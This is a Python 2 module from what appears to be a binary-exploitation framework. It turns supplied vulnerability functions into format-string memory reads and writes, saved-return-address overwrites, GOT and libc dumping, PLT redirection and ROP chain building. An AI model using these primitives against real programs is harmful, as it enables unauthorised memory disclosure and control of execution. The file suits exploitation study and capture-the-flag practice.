import logging
l = logging.getLogger("puppeteer.manipulator")
#l.setLevel(logging.INFO)

import struct
import string # pylint: disable=W0402
import itertools

from .architectures import x86

class Manipulator(object):
    def __init__(self, arch=x86):
        '''
        This should connect to or spawn up the program in question.
        '''

        self.arch = arch

        # this is information that is always valid, even if the binary is restarted
        self.permanent_info = { }

        # this is information that is valid until the binary is restarted
        self.instance_info = { }

        # this is information that is valid for a single connection
        self.connection_info = { }

        self.plt = { }
        self.rop_cleanups = { }

        self.got_base = 0
        self.got_size = 0
        self.got_names = [ ]

        self.auto_connection = None

    def info(self, k):
        for d in (self.connection_info, self.instance_info, self.permanent_info):
            if k in d:
                return d[k]

        raise KeyError(k)

    #
    # Connection stuff
    #

    def connect(self): # pylint: disable=no-self-use
        if self.auto_connection is None:
            raise Exception("Please implement a connect function or set self.auto_connection!")
        else:
            return self.auto_connection.connect()

    def _implemented_connect(self):
        return self.connect.im_class != Manipulator or self.auto_connection is not None

    def _is_connected(self):
        return self.auto_connection.connected

    def _crash(self):
        l.debug("Program crashed!")
        self._disconnect()
        self.instance_info = { }
        self.connection_info = { }

    def _disconnect(self):
        l.debug("Program disconnected!")
        if self.auto_connection:
            self.auto_connection.connected = False
        self.connection_info = { }

    #
    # Utility funcs
    #

    def fix_endness_strided(self, s):
        '''
        Goes through the string, in chunks of the bitwidth of the architecture,
        and fixes endness.
        '''
        if self.arch.endness == '>':
            return s

        return "".join([ s[i:i+self.arch.bytes][::-1] for i in range(0, len(s), self.arch.bytes) ])

    def pack(self, n):
        if type(n) in (int, long):
            return struct.pack(self.arch.struct_fmt, n)
        if type(n) == str:
            return n

    def unpack(self, n):
        if type(n) in (int, long):
            return n
        if type(n) == str:
            return struct.unpack(self.arch.struct_fmt, n)[0]

    def _get_vulns(self, t):
        vulns = [ ]

        l.debug("Looking for a %s vuln...", t)

        for a in dir(self):
            #l.debug("... checking attribute %s", a)
            f = getattr(self, a)
            if hasattr(f, 'puppeteer_flags') and f.puppeteer_flags['type'] == t:
                vulns.append(f)

        if len(vulns) == 0:
            unleet("Couldn't find an %s vuln" % t)
        return vulns

    def _do_vuln(self, vuln_type, args, kwargs):
        funcs = self._get_vulns(vuln_type)

        for f in funcs:
            try:
                l.debug("Trying function %s", f.func_name)
                return f(*args, **kwargs)
            except NotLeetEnough:
                l.debug("... failed!")

        unleet("No %s functions available!" % vuln_type)

    #
    # Actions!
    #

    def do_memory_read(self, addr, length):
        ''' Finds and executes an vuln that does a memory read. '''

        # first, try to do it directly
        try:
            funcs = self._get_vulns('memory_read')
            for f in funcs:
                try:
                    l.debug("Trying a direct memory read with %s", f.__name__)
                    max_size = f.puppeteer_flags['max_size']

                    r = ""
                    while len(r) < length:
                        toread = min(length, max_size)
                        l.debug("... reading %d bytes", toread)
                        r += f(addr + len(r), toread)
                    return r
                except NotLeetEnough:
                    continue
        except NotLeetEnough:
            l.debug("... l4m3! Trying printf read.")

        # now do the printf path
        return self.do_printf_read(addr, length)

    def do_register_read(self, reg):
        ''' Finds and executes an vuln that does a register read. '''
        return self._do_vuln('register_read', (reg,), { })

    def do_memory_write(self, addr, content):
        ''' Finds and executes an vuln that does a memory write. '''

        l.debug("First trying a direct memory write.")
        try:
            return self._do_vuln('memory_write', (addr, content), { })
        except NotLeetEnough:
            l.debug("... just can't do it, captain!")

        l.debug("Now trying a naive printf write.")
        return self.do_printf_write((addr, content))

    def do_register_write(self, reg, content):
        ''' Finds and executes an vuln that does a register write. '''
        return self._do_vuln('register_write', (reg, content), { })

    def do_printf(self, fmt):
        '''
        Finds and executes an vuln that does a memory read.

        @param fmt: the format string!
        @param safe: safety!
        '''
        funcs = self._get_vulns('printf')

        for f in funcs:
            try:
                l.debug("Trying function %s", f.func_name)
                if isinstance(fmt, FmtStr):
                    fmt.set_flags(**f.puppeteer_flags['fmt_flags'])
                    result = f(fmt.build())
                    l.debug("... raw result: %r", result)
                    if len(result) < fmt.literal_length:
                        return ""
                    else:
                        result = result[fmt.literal_length:]
                        l.debug("... after leading trim: %r", result)
                        result = result[:result.rindex(fmt.pad_char * fmt.padding_amount)]
                        l.debug("... after trailing trim: %r", result)
                    return result
                elif isinstance(fmt, str):
                    if f.puppeteer_flags['fmt_flags']['forbidden'] is not None:
                        for c in f.puppeteer_flags['fmt_flags']['forbidden']:
                            if c in fmt:
                                raise unleet("Forbidden chars in format string (%r)" % c)
                    return f(fmt)
                else:
                    raise Exception("Unrecognized format string type. Please provide FmtStr or str")
            except NotLeetEnough:
                l.debug("... failed!")

        l.debug("Couldn't find an appropriate vuln :-(")
        unleet("No working printf functions available!")

    def do_printf_read(self, addr, length, max_failures=10):
        '''
        Do a printf-based memory read.

        @param addr: the address
        @param length: the number of bytes to read
        @param default_char: if something can't be read (for example, because
                             of bad chars in the format string), replace it
                             with this
        @param max_failures: the maximum number of consecutive failures before
                             giving up.
        @param safe: safety
        '''
        l.debug("Reading %d bytes from 0x%x using printf", length, addr)

        max_failures = length if max_failures is None else length
        failures = 0

        content = ""
        while len(content) < length:
            cur_addr = addr + len(content)
            left_length = length - len(content)
            fmt = FmtStr(self.arch).absolute_read(cur_addr)

            try:
                new_content = self.do_printf(fmt)[:left_length]
            except NotLeetEnough:
                failures += 1
                content += '\00'
                continue

            content += new_content
            if len(new_content) == 0:
                l.debug("... potential null byte")
                content += '\x00'

            if failures > max_failures:
                raise unleet("do_printf_read hit more than %d consecutive failures" % max_failures)

        return content

    def do_replace_stack(self, new_ip, pre_stack=None, post_stack=None):
        '''
        Finds and executes a vuln that overflows the stack.
        '''
        funcs = self._get_vulns('stack_overflow')
        for f in funcs:
            if pre_stack is None:
                pre_stack = "A" * f.puppeteer_flags['ip_distance']

            if f.puppeteer_flags['ip_distance'] != len(pre_stack):
                l.debug("Pre-stack length doesn't match the distance to the saved IP!")
                continue

            payload = pre_stack + self.pack(new_ip) + post_stack

            try:
                l.debug("Trying %s", f)
                return f(payload)
            except NotLeetEnough:
                l.debug("... darn")
                continue

        unleet("Couldn't find a compatible stack overflow.")

    def do_stack_overflow(self, towrite):
        return self._do_vuln('stack_overflow', (towrite,), { })

    def do_printf_write(self, writes):
        '''
        Do a memory write using a printf vulnerability.

        @param writes: a tuple of (addr, bytes) tuples
        @param safe: whether it's ok for the program to stop functioning afterwards
        '''

        # this is an overwrite of a set of bytes. We don't care about the output.
        chunks = [ (writes[0]+i, j) for i,j in enumerate(writes[1]) ]
        fmt = FmtStr(self.arch).absolute_writes(chunks)
        return self.do_printf(fmt)

    def do_relative_read(self, offset, length, reg=None):
        try:
            reg = self.arch.sp_name if reg is None else reg
            return self.do_memory_read(self.do_register_read(reg) + offset, length)
        except NotLeetEnough:
            if reg != self.arch.sp_name:
                raise

            result = ""
            while len(result) < length:
                fmt = FmtStr(self.arch).relative_read(offset/self.arch.bytes, length/self.arch.bytes)
                result += self.do_printf(fmt)
            return self.fix_endness_strided(result.decode('hex'))

    #
    # More complex stuff
    #

    def read_got_entry(self, which):
        if type(which) == str:
            which = self.got_names.index(which)
        return self.do_memory_read(self.got_base+which*self.arch.bytes, self.arch.bytes)

    def dump_got(self):
        return self.do_memory_read(self.got_base, self.got_size*self.arch.bytes)

    def do_page_read(self, addr):
        base = addr - (addr % self.arch.page_size)
        return self.do_memory_read(base, self.arch.page_size)

    def redirect_library_function(self, name, target):
        '''
        Redirects a PLT entry to jump to target.

        @params name: the name to redirect
        @params target: the address to redirect to
        '''
        self.do_memory_write(self.plt[name], self.pack(target))

    def read_stack(self, length):
        '''
        Read the stack, from the current stack pointer (or something close), to sp+length

        @params length: the number of bytes to read. More bytes might be attempted if we end up using
                        a printf
        @params safe: if True, only do a safe read, if False, only do an unsafe read, if None do either
        '''

        return self.do_relative_read(0, length, reg=self.arch.sp_name)

    def main_return_address(self, start_offset=None):
        '''
        Get the return address that main will return to. This is usually
        libc_start_main, in libc, which gets you the address of (and a pointer
        into) libc off of a relative read.
        '''

        start_offset = 1 if start_offset is None else start_offset

        # strategy:
        # 1. search for a return address to main
        # 2. look for main's return address (to __libc_start_main)
        # 3. awesome!

        l.debug("Looking for libc!")

        i = 0
        for i in itertools.count(start=start_offset):
            l.debug("... checking offset %d", i)
            v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
            if v >= self.info('main_start') and v <= self.info('main_end'):
                l.debug("... found the return address to main (specifically, to 0x%x) at offset %d!", v, i)
                break

        i += 3 + self.info('main_stackframe_size') / self.arch.bytes
        l.debug("... the return address into __libc_start_main should be at offset %d", i)

        v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
        return v

    def dump_elf(self, addr):
        '''
        Dumps an ELF at the given address. The address can index partway into the ELF.
        '''
        addr -= addr % self.arch.page_size

        pages = { }
        queue = [ addr ]
        l.info("Dumping the ELF that includes 0x%x", addr)

        while len(queue) != 0:
            a = queue.pop()
            l.info("... dumping page 0x%x", a)
            pages[a] = self.do_memory_read(a, self.arch.page_size)

            # assume that ELFs are continuous in memory, and start with '\x7fELF'
            # however, since the first byte often can't be read by a format string
            # (because \x00 is in the address), we need to match '\x00ELF' as well
            if pages[a].startswith('\x7fELF') or pages[a].startswith('\x00ELF'):
                break

            queue.append(a - self.arch.page_size)
            #if pages[a][-4:] != '\x00\x00\x00\x00':
            #   queue.append(a + self.arch.page_size)

            # TODO: the following only works on, at best, static binaries
            # that we just don't have locally. It won't work for things
            # that use relative jumps (almost everything). For that,
            # we should really disassemble the dumped page...
            #if self.pack(a - self.arch.page_size) in pages[a]:
            #   l.info("... 0x%x found!", a - self.arch.page_size)
            #   queue.append(a - self.arch.page_size)
            #if self.pack(a + self.arch.page_size) in pages[a]:
            #   l.info("... 0x%x found!", a + self.arch.page_size)
            #   queue.append(a + self.arch.page_size)

        return pages

    def dump_libc(self, filename, start_offset=None):
        libc_addr = self.main_return_address(start_offset=start_offset)
        libc_contents = self.dump_elf(libc_addr)
        open(filename, "w").write("".join([ libc_contents[k] for k in sorted(libc_contents.keys()) ]))

    #
    # Crazy UI
    #
    def memory_display(self, p, addr):
        perline = 24
        print ""
        print "# Displaying the page at 0x" + (self.arch.python_fmt % addr)
        print ""
        for i in range(0, len(p), perline):
            line = p[i:i+perline]
            count = 0
            for c in line:
                print c.encode('hex'),
                count += 1
                if count % 4 == 0:
                    print "",

            print '|',"".join([ (c if c in string.letters + string.digits + string.punctuation else '.') for c in line ])

        nums = sorted(tuple(set(struct.unpack(self.arch.endness + str(self.arch.page_size/self.arch.bytes) + self.arch.struct_char, p))))

        perline = 10
        print ""
        print "# Aligned integers in the page:"
        print ""
        for i in range(0, len(nums), perline):
            line = nums[i:i+perline]
            print " ".join([ self.arch.python_fmt % c for c in line ])

        nums = sorted(tuple(set([ i - i%self.arch.page_size for i in struct.unpack(self.arch.endness + str(self.arch.page_size/self.arch.bytes) + self.arch.struct_char, p) ])))

        perline = 10
        print ""
        print "# Possible pages to look at next:"
        print ""
        for i in range(0, len(nums), perline):
            line = nums[i:i+perline]
            print " ".join([ self.arch.python_fmt % c for c in line ])

    def memory_explorer(self):
        '''
        This launches an interactive memory explorer, using a memory read vuln.
        It should probably be moved somewhere else.
        '''
        print "###"
        print "### Super Memory Explorer 64"
        print "###"
        print ""
        sp = self.do_register_read('esp')
        print "SP:", hex(sp)

        a = 'asdf'
        addr = None

        while a != 'q':
            print ""
            print "# Please enter one of:"
            print "#"
            print "#    - sp (to go back to the stack)"
            print "#    - a hex address (to look at its page)"
            print "#    - q (to quit)"
            print "#    - '' or 'n'(to look at the next page)"
            print "#    - 'p' (to look at the previous page)"
            a = raw_input("> ")

            if a in ['sp']:
                addr = sp
            elif a in ['', 'n']:
                addr = addr + self.arch.page_size if addr is not None else sp
            elif a in ['p']:
                addr = addr - self.arch.page_size if addr is not None else sp
            else:
                try:
                    addr = int(a, 16)
                except ValueError:
                    continue

            addr -= addr % self.arch.page_size

            p = self.do_page_read(addr)
            self.memory_display(p, addr)

    #
    # ROP stuff
    #

    def rop(self, *args, **kwargs):
        '''
        This returns a new ROP chain that you can then add ROP craziness to.
        '''
        return ROPChain(arch=self.arch, *args, **kwargs)

    def gadget(self, *args, **kwargs):
        '''
        This returns a new ROPGadget (and takes the same args as ROPGadget).
        '''
        return ROPGadget(self.arch, *args, **kwargs)

from .errors import NotLeetEnough
from .formatter import FmtStr
from .rop import ROPChain, ROPGadget
from .utils import unleet

